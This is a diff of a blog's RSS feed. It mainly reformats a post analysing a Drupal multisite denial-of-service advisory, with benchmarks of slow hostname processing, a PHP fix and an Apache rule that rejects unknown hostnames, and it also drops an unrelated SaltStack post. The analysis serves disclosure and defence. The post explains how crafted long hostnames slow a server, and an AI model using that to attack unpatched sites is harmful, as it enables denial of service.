 &lt;p&gt;What this code does is testing the requested hostname to see if a specific settings directory exists for this Host; this is the &lt;strong&gt;core functionality of drupal multisites&lt;/strong&gt;. By default you have the &lt;em&gt;default&lt;/em&gt; settings in the directory &lt;code&gt;&amp;lt;www&amp;gt;/sites/default&lt;/code&gt;, you can then use a &lt;code&gt;&amp;lt;www&amp;gt;/sites/sites.php&lt;/code&gt; file to map hostnames with other settings files -- but this will only cover names that you &lt;strong&gt;do&lt;/strong&gt; have, not the bad ones --, and you &lt;em&gt;can&lt;/em&gt; also have some directories based on the hostname, or part of it, containing a &lt;code&gt;settings.php&lt;/code&gt; file. Note that you &lt;strong&gt;cannot suspend this multisite feature&lt;/strong&gt;, it&#39;s always there, no opt-in or opt-out until Drupal 8 release.&lt;/p&gt;
 
@@ -2687,7 +3108,7 @@ Host: www.example.com
 
 &lt;p&gt;The real issue is on &lt;code&gt;array_slice&lt;/code&gt;, performing several thousands of inverted array_slice is &lt;em&gt;really very very slow&lt;/em&gt;. The first ones are quite fast but the last steps are longer, and we will make several thousands of array_slice operations.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;ARRAY_SLICE array of &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; elts =&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
       &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -2696,7 +3117,7 @@ Host: www.example.com
       &lt;span class=&quot;nv&quot;&gt;$time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;time for array_slice to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$time&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; (s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;cm&quot;&gt;/&lt;em&gt;&lt;/span&gt;
+    &lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -10    : 0.0004069805 (s)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -100   : 0.0004091262 (s)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -500   : 0.0004727840 (s)&lt;/span&gt;
@@ -2706,7 +3127,8 @@ Host: www.example.com
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -12000 : 0.0018289089 (s)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -14000 : 0.0025160312 (s)&lt;/span&gt;
 &lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -16000 : 0.0032360553 (s)&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;    &lt;/em&gt;/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;cm&quot;&gt;    */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;0.003s seems quite fast, but that&#39;s already 7.5 times more than the first array_slices. I made a simple graph to show theses times growth.&lt;/p&gt;
 
@@ -2718,11 +3140,11 @@ Host: www.example.com
 
 &lt;p&gt;My first fix used an &lt;code&gt;array_walk&lt;/code&gt; call to prepare all names that should be checked, instead of rebuilding this name on the loop, this way:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;sd&quot;&gt;/&lt;em&gt;*&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
 &lt;span class=&quot;sd&quot;&gt;     * Apply this function with an array_walk to obtain an array with names that&lt;/span&gt;
 &lt;span class=&quot;sd&quot;&gt;     * need to be tested.&lt;/span&gt;
-&lt;span class=&quot;sd&quot;&gt;     &lt;/em&gt;/&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;prepare_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -2740,7 +3162,8 @@ Host: www.example.com
       &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$work_server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;And this fixed the performance issue (when &lt;code&gt;file_exists&lt;/code&gt; is fast). But preventing bad hostnames as we have in the final fix is a better fix, more radical, no good reason to manage several thousand of subdomains.&lt;/p&gt;
 
@@ -2778,10 +3201,11 @@ Host: www.example.com
 
 &lt;p&gt;The Mod_rewrite Apache module will receive the same &lt;strong&gt;HOSTNAME&lt;/strong&gt; as PHP in the &lt;strong&gt;HTTP_HOST&lt;/strong&gt; variable. If the Absolute-URI trick is used mod_rewrite could detect bad hostname and reject the request. Let&#39;s say you have one or two valid DNS for your Drupal websites (here &lt;code&gt;foo.example.com&lt;/code&gt; and &lt;code&gt;bar.example.com&lt;/code&gt;), then check Apache made the right job and reached your Drupal with theses valid names:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;    &lt;span class=&quot;c&quot;&gt;# Reject with a 403 any hostname wich is not in our list of supported domains&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^foo.example.com$
-    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bar.example.com$
-    &lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; .* - [F,L]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Reject with a 403 any hostname wich is not in our list of supported domains&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^foo\.example\.com$
+    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bar\.example\.com$
+    &lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; .* - [F,L]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;h2&gt;The absolute-URI trick?&lt;/h2&gt;
 
@@ -2845,7 +3269,7 @@ Host: something.else
 
 </description>
 				<published>2014-09-19 00:00:00 +0200</published>
-				<link>http://regilero.github.io/security/english/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/</link>
+				<link>http://regilero.github.io/english/security/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/</link>
 			</item>
 		
 			<item>
@@ -3116,89 +3540,7 @@ b&#39;\xe6\xba\x96&#39;
 
 </description>
 				<published>2014-02-05 00:00:00 +0100</published>
-				<link>http://regilero.github.io/saltstack/english/2014/02/05/saltstack-use-more-than-ascii7-on-sls-files-with-yaml_utf8-option/</link>
-			</item>
-		
-			<item>
-				<title>SaltStack, Merge dictionaries of settings with grains.filter_by</title>
-				<description>&lt;p&gt;If you read some formulas you may have noticed a nice way of managing settings. The &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;grains.filter_by&lt;/code&gt;&lt;/a&gt; function. Values used in salt states are usually dynamic, coming from grains, from the pillar, from variations depending on the host environment. When you have a big number of variables using only the default jinja tools is sometimes frustrating. This is a must-know feature.&lt;/p&gt;
-
-&lt;p&gt;There&#39;s a nice example in &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/map.jinja&quot;&gt;the Apache formula map.jinja file&lt;/a&gt;, which may evolve, so let&#39;s show what it looks like:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;{% set apache = salt[&#39;grains.filter_by&#39;]({
-    &#39;Debian&#39;: {
-        &#39;server&#39;: &#39;apache2&#39;,
-        &#39;service&#39;: &#39;apache2&#39;,
-
-        &#39;mod_wsgi&#39;: &#39;libapache2-mod-wsgi&#39;,
-
-        &#39;vhostdir&#39;: &#39;/etc/apache2/sites-available&#39;,
-        &#39;confdir&#39;: &#39;/etc/apache2/conf.d&#39;,
-        &#39;logdir&#39;: &#39;/var/log/apache2&#39;,
-        &#39;wwwdir&#39;: &#39;/srv&#39;,
-    },
-    &#39;RedHat&#39;: {
-        &#39;server&#39;: &#39;httpd&#39;,
-        &#39;service&#39;: &#39;httpd&#39;,
-
-        &#39;mod_wsgi&#39;: &#39;mod_wsgi&#39;,
-
-        &#39;vhostdir&#39;: &#39;/etc/httpd/conf.d&#39;,
-        &#39;confdir&#39;: &#39;/etc/httpd/conf.d&#39;,
-        &#39;logdir&#39;: &#39;/var/log/httpd&#39;,
-        &#39;wwwdir&#39;: &#39;/var/www&#39;,
-    },
-}, merge=salt[&#39;pillar.get&#39;](&#39;apache:lookup&#39;)) %}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This sets an &lt;code&gt;apache&lt;/code&gt; jinja variable, a dictionary containing &lt;code&gt;server&lt;/code&gt;, &lt;code&gt;service&lt;/code&gt;,&lt;code&gt;confdir&lt;/code&gt; or &lt;code&gt;wwwdir&lt;/code&gt; keys (and some more).&lt;/p&gt;
-
-&lt;p&gt;The main idea of &lt;code&gt;salt[&#39;grains.filter_by&#39;]&lt;/code&gt; is to filter a settings dictionary based on a grain: &lt;strong&gt;os_family&lt;/strong&gt; (here the value may be &#39;Redhat&#39; or &#39;Debian&#39;).&lt;/p&gt;
-
-&lt;p&gt;Usage of this &lt;code&gt;map.jinja&lt;/code&gt; file can be &lt;a href=&quot;https://github.com/saltstack-formulas/apache-formula/blob/master/apache/init.sls&quot;&gt;seen on the init.sls&lt;/a&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;{% from &quot;apache/map.jinja&quot; import apache with context %}
-
-apache:
-  pkg:
-    - installed
-    - name: {{ apache.server }}
-(...)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now if you have a pretty recent version (&gt; 0.17.2) of Salt-stack this &lt;a href=&quot;http://docs.saltstack.com/ref/modules/all/salt.modules.grains.html#salt.modules.grains.filter_by&quot;&gt;&lt;code&gt;filter_by&lt;/code&gt;&lt;/a&gt; function has some new very interesting features.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;salt.modules.grains.filter_by(lookup_dict, grain=&#39;os_family&#39;, merge=None, default=&#39;default&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;the &lt;strong&gt;lookup dict&lt;/strong&gt; is your dictionary of settings where you want a filter to be applied, so at the end you will obtain a subtree of this dictionary.&lt;/li&gt;
-&lt;li&gt;the &lt;strong&gt;grain&lt;/strong&gt; is by default the &lt;em&gt;os_family&lt;/em&gt; grain, but you can use any defined grain key (&lt;code&gt;salt-call grains.items&lt;/code&gt; to see them).&lt;/li&gt;
-&lt;li&gt;the &lt;strong&gt;merge&lt;/strong&gt; argument lets you merge another dictionary on top of the end result, this is very useful, as seen on the apache&#39;s formula, to retrieve pillar data overriding the default settings dictionary.&lt;/li&gt;
-&lt;li&gt;and the new argument is &lt;strong&gt;default&lt;/strong&gt;, which lets you specify which key of the &lt;em&gt;lookup dict&lt;/em&gt; should be used if you did not have the requested grain or if the requested grain value is not present in this &lt;em&gt;lookup dict&lt;/em&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;p&gt;So this function is now a really good shortcut for a default settings registry mapping.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;{% set settings = salt[&#39;grains.filter_by&#39;]({
-    &#39;unset&#39;: { &#39;foo&#39;: &#39;The coconut&#39;s tropical&#39;, &#39;bar&#39;: &#39;King Arthur&#39;},
-    &#39;prod&#39;: { &#39;foo&#39;: &#39;Bridgekeeper&#39;, &#39;bar&#39;: &#39;We want a shrubbery&#39; },
-    &#39;preprod&#39;: { &#39;foo&#39;: &#39;Sir Lancelot&#39;, bar: &#39;Blue. No, yel…&#39;},
-  },
-  grain=&#39;my_env&#39;,
-  merge=salt[&#39;pillar.get&#39;](&#39;apache:lookup&#39;)),
-  default=&#39;unset&#39; 
-%}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-				<published>2014-01-28 00:00:00 +0100</published>
-				<link>http://regilero.github.io/saltstack/english/2014/01/28/saltstack_merge_dictionaries_of_settings_with_grains_filter_by/</link>
+				<link>http://regilero.github.io/english/saltstack/2014/02/05/saltstack-use-more-than-ascii7-on-sls-files-with-yaml_utf8-option/</link>
 			</item>
 		
 	</channel>
